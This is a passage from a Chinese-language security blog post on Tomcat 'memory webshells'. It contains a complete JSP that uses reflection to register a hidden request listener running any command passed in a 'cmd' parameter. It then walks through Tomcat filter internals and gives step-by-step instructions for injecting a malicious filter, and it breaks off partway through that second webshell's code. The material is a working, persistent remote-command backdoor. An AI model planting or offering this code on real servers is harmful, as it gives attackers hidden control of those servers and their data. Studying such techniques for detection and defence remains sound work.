</span><br></pre></td></tr></table></figure><p>以下是代码的具体实现:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ page contentType=<span class="string">&quot;text/html;charset=UTF-8&quot;</span> language=<span class="string">&quot;java&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.core.ApplicationContext&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.core.StandardContext&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;javax.servlet.*&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;javax.servlet.annotation.WebServlet&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;javax.servlet.http.HttpServlet&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;javax.servlet.http.HttpServletRequest&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;javax.servlet.http.HttpServletResponse&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.io.IOException&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.lang.reflect.Field&quot;</span> %&gt;</span><br><span class="line"></span><br><span class="line">&lt;%</span><br><span class="line">    <span class="keyword">class</span> <span class="title class_">S</span> <span class="keyword">implements</span> <span class="title class_">ServletRequestListener</span>&#123;</span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">requestDestroyed</span><span class="params">(ServletRequestEvent servletServletRequestListenerRequestEvent)</span> &#123;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">requestInitialized</span><span class="params">(ServletRequestEvent servletRequestEvent)</span> &#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">cmd</span> <span class="operator">=</span> servletRequestEvent.getServletRequest().getParameter(<span class="string">&quot;cmd&quot;</span>);</span><br><span class="line">            <span class="keyword">if</span>(cmd != <span class="literal">null</span>)&#123;</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    Runtime.getRuntime().exec(cmd);</span><br><span class="line">                &#125; <span class="keyword">catch</span> (IOException e) &#123;&#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">%&gt;</span><br><span class="line"></span><br><span class="line">&lt;%</span><br><span class="line">    <span class="type">ServletContext</span> <span class="variable">servletContext</span> <span class="operator">=</span>  request.getServletContext();</span><br><span class="line">    <span class="type">Field</span> <span class="variable">appctx</span> <span class="operator">=</span> servletContext.getClass().getDeclaredField(<span class="string">&quot;context&quot;</span>);</span><br><span class="line">    appctx.setAccessible(<span class="literal">true</span>);</span><br><span class="line">    <span class="type">ApplicationContext</span> <span class="variable">applicationContext</span> <span class="operator">=</span> (ApplicationContext) appctx.get(servletContext);</span><br><span class="line">    <span class="type">Field</span> <span class="variable">stdctx</span> <span class="operator">=</span> applicationContext.getClass().getDeclaredField(<span class="string">&quot;context&quot;</span>);</span><br><span class="line">    stdctx.setAccessible(<span class="literal">true</span>);</span><br><span class="line">    <span class="type">StandardContext</span> <span class="variable">standardContext</span> <span class="operator">=</span> (StandardContext) stdctx.get(applicationContext);</span><br><span class="line">    <span class="type">S</span> <span class="variable">servletRequestListener</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">S</span>();</span><br><span class="line">    standardContext.addApplicationEventListener(servletRequestListener);</span><br><span class="line">    out.println(<span class="string">&quot;inject success&quot;</span>);</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure><h2 id="Filter容器与FilterDefs、FilterConfigs、FilterMaps、FilterChain"><a href="#Filter容器与FilterDefs、FilterConfigs、FilterMaps、FilterChain" class="headerlink" title="Filter容器与FilterDefs、FilterConfigs、FilterMaps、FilterChain"></a>Filter容器与FilterDefs、FilterConfigs、FilterMaps、FilterChain</h2><p>开头先明确一点，就是<code>Filter</code>容器是用于对请求和响应进行过滤和处理的，以下这张图是根据<code>Skay</code>师傅文章中的图片重制的：</p><blockquote><p><a href="https://mp.weixin.qq.com/s/eI-50-_W89eN8tsKi-5j4g">https://mp.weixin.qq.com/s/eI-50-_W89eN8tsKi-5j4g</a></p></blockquote><p><a href="https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/filter-demo.png"><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/filter-demo.png" alt="img"></a></p><p>从上图可以看出，这个<code>filter</code>就是一个关卡，客户端的请求在经过<code>filter</code>之后才会到<code>Servlet</code>，那么如果我们动态创建一个<code>filter</code>并且将其放在最前面，我们的<code>filter</code>就会最先执行，当我们在<code>filter</code>中添加恶意代码，就可以实现命令执行，形成内存马。</p><p>这些名词其实很容易理解，首先，需要定义过滤器<code>FilterDef</code>，存放这些<code>FilterDef</code>的数组被称为<code>FilterDefs</code>，每个<code>FilterDef</code>定义了一个具体的过滤器，包括描述信息、名称、过滤器实例以及<code>class</code>等，这一点可以从<code>org/apache/tomcat/util/descriptor/web/FilterDef.java</code>的代码中看出来；然后是<code>FilterDefs</code>，它只是过滤器的抽象定义，而<code>FilterConfigs</code>则是这些过滤器的具体配置实例，我们可以为每个过滤器定义具体的配置参数，以满足系统的需求；紧接着是<code>FilterMaps</code>，它是用于将<code>FilterConfigs</code>映射到具体的请求路径或其他标识上，这样系统在处理请求时就能够根据请求的路径或标识找到对应的<code>FilterConfigs</code>，从而确定要执行的过滤器链；而<code>FilterChain</code>是由多个<code>FilterConfigs</code>组成的链式结构，它定义了过滤器的执行顺序，在处理请求时系统会按照<code>FilterChain</code>中的顺序依次执行每个过滤器，对请求进行过滤和处理。</p><h2 id="编写一个简单的Filter"><a href="#编写一个简单的Filter" class="headerlink" title="编写一个简单的Filter"></a>编写一个简单的Filter</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.servlet.*;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.annotation.WebFilter;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="meta">@WebFilter(&quot;/test&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TestFilter</span> <span class="keyword">implements</span> <span class="title class_">Filter</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">init</span><span class="params">(FilterConfig filterConfig)</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;[*] Filter初始化创建&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">doFilter</span><span class="params">(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain)</span> <span class="keyword">throws</span> IOException, ServletException &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;[*] Filter执行过滤操作&quot;</span>);</span><br><span class="line">        filterChain.doFilter(servletRequest, servletResponse);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">destroy</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;[*] Filter已销毁&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>跑起来之后，控制台输出<code>[*] Filter初始化创建</code>，当我们访问<code>/test</code>路由的时候，控制台继续输出<code>[*] Filter执行过滤操作</code>，当我们结束<code>tomcat</code>的时候，会触发<code>destroy</code>方法，从而输出<code>[*] Filter已销毁</code>：</p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20250907152518018.png" alt="image-20250907152518018"></p><h2 id="从代码层面分析Filter运行的整体流程"><a href="#从代码层面分析Filter运行的整体流程" class="headerlink" title="从代码层面分析Filter运行的整体流程"></a>从代码层面分析Filter运行的整体流程</h2><p>我们在上面的<code>demo</code>中的<code>doFilter</code>函数这里下断点进行调试：</p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20250907152955902.png" alt="image-20250907152955902"></p><p>跟进。</p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20250907153136032.png" alt="image-20250907153136032"></p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20250907153239615.png" alt="image-20250907153239615"></p><p>过滤器使用的时候。</p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20250907153830202.png" alt="image-20250907153830202"></p><p>查看调用栈，跟进StandardWrapperVavle.invoke()方法:</p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20250907153931635.png" alt="image-20250907153931635"></p><p>发现他是根据filterChain来去做filter的，根据搜索找到filterChain的定义位置:</p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20250907153958860.png" alt="image-20250907153958860"></p><p>重新下断点到这个位置，跟进ApplicationFilterFactory.createFilterChain()方法，分析该方法，发现其先会会调用 getParent() 方法获取StandardContext，再获取filterMaps:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> ApplicationFilterChain <span class="title function_">createFilterChain</span><span class="params">(ServletRequest request, Wrapper wrapper, Servlet servlet)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (servlet == <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="type">ApplicationFilterChain</span> <span class="variable">filterChain</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">if</span> (request <span class="keyword">instanceof</span> Request) &#123;</span><br><span class="line">            <span class="type">Request</span> <span class="variable">req</span> <span class="operator">=</span> (Request)request;</span><br><span class="line">            <span class="keyword">if</span> (Globals.IS_SECURITY_ENABLED) &#123;</span><br><span class="line">                filterChain = <span class="keyword">new</span> <span class="title class_">ApplicationFilterChain</span>();</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                filterChain = (ApplicationFilterChain)req.getFilterChain();</span><br><span class="line">                <span class="keyword">if</span> (filterChain == <span class="literal">null</span>) &#123;</span><br><span class="line">                    filterChain = <span class="keyword">new</span> <span class="title class_">ApplicationFilterChain</span>();</span><br><span class="line">                    req.setFilterChain(filterChain);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            filterChain = <span class="keyword">new</span> <span class="title class_">ApplicationFilterChain</span>();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        filterChain.setServlet(servlet);</span><br><span class="line">        filterChain.setServletSupportsAsync(wrapper.isAsyncSupported());</span><br><span class="line">        <span class="type">StandardContext</span> <span class="variable">context</span> <span class="operator">=</span> (StandardContext)wrapper.getParent();</span><br><span class="line">        FilterMap[] filterMaps = context.findFilterMaps();</span><br><span class="line">        <span class="keyword">if</span> (filterMaps != <span class="literal">null</span> &amp;&amp; filterMaps.length != <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="type">DispatcherType</span> <span class="variable">dispatcher</span> <span class="operator">=</span> (DispatcherType)request.getAttribute(<span class="string">&quot;org.apache.catalina.core.DISPATCHER_TYPE&quot;</span>);</span><br><span class="line">            <span class="type">String</span> <span class="variable">requestPath</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">            <span class="type">Object</span> <span class="variable">attribute</span> <span class="operator">=</span> request.getAttribute(<span class="string">&quot;org.apache.catalina.core.DISPATCHER_REQUEST_PATH&quot;</span>);</span><br><span class="line">            <span class="keyword">if</span> (attribute != <span class="literal">null</span>) &#123;</span><br><span class="line">                requestPath = attribute.toString();</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="type">String</span> <span class="variable">servletName</span> <span class="operator">=</span> wrapper.getName();</span><br><span class="line">            FilterMap[] var10 = filterMaps;</span><br><span class="line">            <span class="type">int</span> <span class="variable">var11</span> <span class="operator">=</span> filterMaps.length;</span><br><span class="line"></span><br><span class="line">            <span class="type">int</span> var12;</span><br><span class="line">            FilterMap filterMap;</span><br><span class="line">            ApplicationFilterConfig filterConfig;</span><br><span class="line">            <span class="keyword">for</span>(var12 = <span class="number">0</span>; var12 &lt; var11; ++var12) &#123;</span><br><span class="line">                filterMap = var10[var12];</span><br><span class="line">                <span class="keyword">if</span> (matchDispatcher(filterMap, dispatcher) &amp;&amp; matchFiltersURL(filterMap, requestPath)) &#123;</span><br><span class="line">                    filterConfig = (ApplicationFilterConfig)context.findFilterConfig(filterMap.getFilterName());</span><br><span class="line">                    <span class="keyword">if</span> (filterConfig != <span class="literal">null</span>) &#123;</span><br><span class="line">                        filterChain.addFilter(filterConfig);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            var10 = filterMaps;</span><br><span class="line">            var11 = filterMaps.length;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">for</span>(var12 = <span class="number">0</span>; var12 &lt; var11; ++var12) &#123;</span><br><span class="line">                filterMap = var10[var12];</span><br><span class="line">                <span class="keyword">if</span> (matchDispatcher(filterMap, dispatcher) &amp;&amp; matchFiltersServlet(filterMap, servletName)) &#123;</span><br><span class="line">                    filterConfig = (ApplicationFilterConfig)context.findFilterConfig(filterMap.getFilterName());</span><br><span class="line">                    <span class="keyword">if</span> (filterConfig != <span class="literal">null</span>) &#123;</span><br><span class="line">                        filterChain.addFilter(filterConfig);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> filterChain;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> filterChain;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们在该方法和下面定义<code>filterMaps</code>那行下断点进行调试，可以看到，这段代码先是判断<code>servlet</code>是否为空，如果是就表示没有有效的<code>servlet</code>，无法创建过滤器链；然后根据传入的<code>ServletRequest</code>的类型来分类处理，如果是<code>Request</code>类型，并且启用了安全性，那么就创建一个新的<code>ApplicationFilterChain</code>，如果没启用，那么就尝试从请求中获取现有的过滤器链，如果不存在那么就创建一个新的；接着是设置过滤器链的<code>Servlet</code>和异步支持属性，这个没啥说的；关键点在于后面从<code>Wrapper</code>中获取父级上下文（<code>StandardContext</code>），然后获取该上下文中定义的过滤器映射数组（<code>FilterMap</code>）；最后遍历过滤器映射数组，根据请求的<code>DispatcherType</code>和请求路径匹配过滤器，并将匹配的过滤器添加到过滤器链中，最终返回创建或更新后的过滤器链。</p><p>好了，大致过程到这里就结束了，但是我们的目的是打入内存马，也就是要动态地创建一个<code>Filter</code>，回顾之前的调试过程，我们发现在<code>createFilterChain</code>那个函数里面有两个关键点：</p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20250907154452596.png" alt="image-20250907154452596"></p><p>也就是这里我用箭头指出来的<code>org.apache.catalina.core.StandardContext#findFilterMaps</code>和<code>org.apache.catalina.core.StandardContext#findFilterConfig</code>。</p><p>二者的实现代码粘贴如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">public FilterMap[] findFilterMaps() &#123;</span><br><span class="line">    return filterMaps.asArray();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">public FilterConfig findFilterConfig(String name) &#123;</span><br><span class="line">    synchronized (filterDefs) &#123;</span><br><span class="line">        return filterConfigs.get(name);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>也就是说我们只需要查找到现有的上下文，然后往里面插入我们自定义的恶意过滤器映射和过滤器配置，就可以实现动态添加过滤器了。</p><p>那也就是说，我们现在的问题就转化为如何添加<code>filterMap</code>和<code>filterConfig</code>。我们搜索关键词<code>addFilterMap</code>，即可看到在<code>StandardContext</code>中有两个相关的方法：</p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20250907153239615.png" alt="image-20250907153239615"></p><p>注释里面也说的很清楚，<code>addFilterMap</code>是在一组映射末尾添加新的我们自定义的新映射；而<code>addFilterMapBefore</code>则会自动把我们创建的<code>filterMap</code>丢到第一位去，无需再手动排序，这正是我们需要的呀！</p><p>可以看到，上面的<code>addFilterMapBefore</code>函数中第一步是先执行<code>org.apache.catalina.core.StandardContext#validateFilterMap</code>这个函数，点击去看看：</p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20250907160241589.png" alt="image-20250907160241589"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Validate the supplied FilterMap.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> filterMap the filter mapping</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">validateFilterMap</span><span class="params">(FilterMap filterMap)</span> &#123;</span><br><span class="line">    <span class="comment">// Validate the proposed filter mapping</span></span><br><span class="line">    <span class="type">String</span> <span class="variable">filterName</span> <span class="operator">=</span> filterMap.getFilterName();</span><br><span class="line">    String[] servletNames = filterMap.getServletNames();</span><br><span class="line">    String[] urlPatterns = filterMap.getURLPatterns();</span><br><span class="line">    <span class="keyword">if</span> (findFilterDef(filterName) == <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IllegalArgumentException</span>(sm.getString(<span class="string">&quot;standardContext.filterMap.name&quot;</span>, filterName));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!filterMap.getMatchAllServletNames() &amp;&amp; !filterMap.getMatchAllUrlPatterns() &amp;&amp; (servletNames.length == <span class="number">0</span>) &amp;&amp;</span><br><span class="line">            (urlPatterns.length == <span class="number">0</span>)) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IllegalArgumentException</span>(sm.getString(<span class="string">&quot;standardContext.filterMap.either&quot;</span>));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (String urlPattern : urlPatterns) &#123;</span><br><span class="line">        <span class="keyword">if</span> (!validateURLPattern(urlPattern)) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IllegalArgumentException</span>(sm.getString(<span class="string">&quot;standardContext.filterMap.pattern&quot;</span>, urlPattern));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>发现我们需要保证它在根据<code>filterName</code>找<code>filterDef</code>的时候，得能找到，也就是说，我们还得自定义<code>filterDef</code>并把它加入到<code>filterDefs</code>，不过这个也很简单，也有对应的方法，也就是<code>org.apache.catalina.core.StandardContext#addFilterDef</code>：</p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20250907160448593.png" alt="image-20250907160448593"></p><p>搞定，继续去看<code>filterConfig</code>如何添加。经过搜索发现，不存在类似上面的<code>addFilterConfig</code>这种方法,但是有<code>filterStart</code>和<code>filterStop</code>这两个方法：</p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20250907161221063.png" alt="image-20250907161221063"></p><p>那也就是说，我们只能通过反射的方法去获取相关属性并添加进去。</p><p>引用一张经典图片来描述filter的工作原理:<img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/20250624155918-2104e00c-50d1-1.png" alt="img"></p><h2 id="Filter内存马实现"><a href="#Filter内存马实现" class="headerlink" title="Filter内存马实现"></a>Filter内存马实现</h2><p>如果我们想要写一个<code>Filter</code>内存马，需要经过以下步骤：</p><blockquote><p>参考：<a href="https://longlone.top/%E5%AE%89%E5%85%A8/java/java%E5%AE%89%E5%85%A8/%E5%86%85%E5%AD%98%E9%A9%AC/Tomcat-Filter%E5%9E%8B/">https://longlone.top/安全/java/java安全/内存马/Tomcat-Filter型/</a></p></blockquote><ul><li>获取<code>StandardContext</code>；</li><li>继承并编写一个恶意<code>filter</code>；</li><li>实例化一个<code>FilterDef</code>类，包装<code>filter</code>并存放到<code>StandardContext.filterDefs</code>中；</li><li>实例化一个<code>FilterMap</code>类，将我们的<code>Filter</code>和<code>urlpattern</code>相对应，使用<code>addFilterMapBefore</code>存放到<code>StandardContext.filterMaps</code>中；</li><li>通过反射获取<code>filterConfigs</code>，实例化一个<code>FilterConfig</code>（<code>ApplicationFilterConfig</code>）类，传入<code>StandardContext</code>与<code>filterDefs</code>，存放到<code>filterConfig</code>中。</li></ul><blockquote><p>参考：<a href="https://tyaoo.github.io/2021/12/06/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC/">https://tyaoo.github.io/2021/12/06/Tomcat内存马/</a></p></blockquote><p>需要注意的是，一定要先修改<code>filterDef</code>，再修改<code>filterMap</code>，不然会抛出找不到<code>filterName</code>的异常。</p><p>由以上结论我们可以写出如下内存马<code>demo</code>：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.lang.reflect.*&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.core.StandardContext&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.util.Map&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.tomcat.util.descriptor.web.FilterDef&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.tomcat.util.descriptor.web.FilterMap&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.core.ApplicationFilterConfig&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.Context&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.core.ApplicationContext&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.io.*&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.util.Scanner&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.util.List&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.util.ArrayList&quot;</span> %&gt;</span><br><span class="line">&lt;%</span><br><span class="line">    <span class="type">ServletContext</span> <span class="variable">servletContext</span> <span class="operator">=</span> request.getSession().getServletContext();</span><br><span class="line">    <span class="type">Field</span> <span class="variable">appctx</span> <span class="operator">=</span> 